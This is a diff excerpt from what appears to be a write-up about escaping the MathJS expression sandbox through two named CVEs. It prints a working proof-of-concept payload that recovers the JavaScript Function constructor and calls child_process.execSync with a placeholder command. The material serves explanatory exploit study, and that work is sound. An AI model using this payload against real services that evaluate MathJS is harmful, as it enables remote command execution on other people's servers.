@@ -16,7 +16,7 @@ Dorking this error message gave me [this issue](https://github.com/josdejong/mat
 
 Some months ago, this library patched two sandbox escape vulnerabilities recorded as `CVE-2026-41139` and `CVE-2026-40897`. Basically, some MathJS internals would allow you to get the JavaScript Function constructor which will let you create functions with arbitrary code (yeah, RCE). I took and modified a sample PoC into this:
 
-```js
+```js - payload.js
 a = reviver('',{'mathjs':'ArrayNode'}).toJSON()['items']; a.map = f(callback)=callback({'map':f2(callback2)=callback2({},'constructor'),'type':sum}); xd = reviver('',{'mathjs':'FunctionAssignmentNode','name':'a','params':a,'expr':reviver('',{'mathjs':'ConstantNode'})}); g = xd.toJSON()['params']['type']; h = g("return process.mainModule.require('child_process').execSync(`<command here>`)"); h(); 1 + 1
 ```
 
